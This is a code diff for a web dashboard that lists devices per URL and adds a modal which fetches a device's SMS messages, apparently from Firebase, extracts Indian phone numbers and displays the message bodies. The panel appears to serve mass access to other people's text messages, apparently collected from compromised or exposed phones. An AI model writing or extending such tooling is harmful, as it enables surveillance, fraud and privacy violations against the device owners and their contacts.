@@ -110,6 +110,18 @@
              border-top-color: var(--accent); border-radius: 50%; animation: spin .7s linear infinite; margin-bottom: 10px; }
   @keyframes spin { to { transform: rotate(360deg); } }
 
+  /* ── Modal ── */
+  .modal-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,.7); z-index:1000; overflow-y:auto; }
+  .modal-overlay.open { display:flex; align-items:flex-start; justify-content:center; padding:40px 16px; }
+  .modal-box { background:var(--bg2); border:1px solid var(--border); border-radius:12px; width:100%; max-width:760px; padding:20px; }
+  .modal-box h3 { font-size:15px; margin-bottom:12px; }
+  .modal-close { float:right; background:var(--bg3); border:1px solid var(--border); border-radius:6px; color:var(--muted); padding:4px 10px; cursor:pointer; }
+  .modal-close:hover { color:var(--text); }
+  .hit-card { background:var(--bg3); border:1px solid var(--border); border-radius:8px; padding:10px 14px; margin-bottom:10px; }
+  .hit-phones { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:6px; }
+  .phone-chip { background:rgba(94,114,235,.15); color:var(--accent); border-radius:4px; padding:2px 8px; font-size:12px; font-weight:600; }
+  .hit-body { font-size:12px; color:var(--muted); line-height:1.5; word-break:break-word; }
+
   /* ── Responsive ── */
   @media (max-width: 600px) {
     header { flex-wrap: wrap; } .search-bar { margin-left: 0; width: 100%; }
@@ -167,9 +179,19 @@
   </div>
 </main>
 
+<!-- ── SearchNo Modal ── -->
+<div class="modal-overlay" id="searchno-modal" onclick="if(event.target===this)closeSearchno()">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeSearchno()">✕ Close</button>
+    <h3 id="searchno-title">📞 Phone Numbers in SMS</h3>
+    <div id="searchno-body"><div class="loading"><div class="spinner"></div><br>Fetching SMS…</div></div>
+  </div>
+</div>
+
 <script>
 let allUrls = [];
 let currentDevices = [];
+let currentUrlId = 0;
 let activeFilter = 'all';
 let currentSort = 'total';
 
@@ -303,7 +325,7 @@ async function openUrl(id) {
   const res = await fetch(`/api/url/${id}`);
   const data = await res.json();
   currentDevices = data.devices || [];
-  activeFilter = 'all';
+  currentUrlId = id;
 
   // Header
   const online  = currentDevices.filter(d => d.status === 'online').length;
@@ -393,7 +415,8 @@ function renderDevices() {
       <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
       <td>${kwHtml}</td>
       <td>${idsHtml}</td>
-      <td><a class="sms-btn" href="${d.smsLink}" target="_blank">📥 SMS</a></td>
+      <td><a class="sms-btn" href="${d.smsLink}" target="_blank">📥 SMS</a>
+          <button class="sms-btn" style="margin-left:4px" onclick="openSearchno(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">📞</button></td>
     </tr>`;
   }).join('');
 }
@@ -401,6 +424,54 @@ function renderDevices() {
 function showUrls() {
   document.getElementById('view-devices').classList.remove('active');
   document.getElementById('view-urls').classList.add('active');
+}
+
+// ── SearchNo Modal ────────────────────────────────────────────────────────────
+function closeSearchno() {
+  document.getElementById('searchno-modal').classList.remove('open');
+}
+
+async function openSearchno(evt, urlId, deviceId, brand) {
+  evt.stopPropagation();
+  const modal   = document.getElementById('searchno-modal');
+  const title   = document.getElementById('searchno-title');
+  const body    = document.getElementById('searchno-body');
+
+  title.textContent = `📞 Phone Numbers in SMS — ${brand} (${deviceId.slice(0,16)})`;
+  body.innerHTML    = '<div class="loading"><div class="spinner"></div><br>Fetching SMS from Firebase…</div>';
+  modal.classList.add('open');
+
+  try {
+    const res  = await fetch(`/api/url/${urlId}/device/${encodeURIComponent(deviceId)}/searchno`);
+    const data = await res.json();
+
+    if (data.error && !data.hits?.length) {
+      body.innerHTML = `<p style="color:var(--red)">Error: ${data.error}</p>`;
+      return;
+    }
+    if (!data.hits || data.hits.length === 0) {
+      body.innerHTML = '<p style="color:var(--muted)">📭 No Indian phone numbers found in SMS for this device.</p>';
+      return;
+    }
+
+    const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    body.innerHTML = `
+      <p style="color:var(--muted);margin-bottom:12px;font-size:13px">
+        Found <b style="color:var(--text)">${data.hits.length}</b> SMS message(s) containing phone numbers
+        ${data.hits.length >= 100 ? ' <span style="color:var(--yellow)">(showing first 100)</span>' : ''}
+      </p>
+      ${data.hits.map(h => `
+        <div class="hit-card">
+          <div class="hit-phones">
+            ${h.phones.map(p => `<span class="phone-chip">${p}</span>`).join('')}
+          </div>
+          <div class="hit-body">${esc(h.body.slice(0, 300))}${h.body.length > 300 ? '…' : ''}</div>
+        </div>
+      `).join('')}
+    `;
+  } catch (e) {
+    body.innerHTML = `<p style="color:var(--red)">Failed to fetch: ${e.message}</p>`;
+  }
 }
 
 // ── Init ──────────────────────────────────────────────────────────────────────
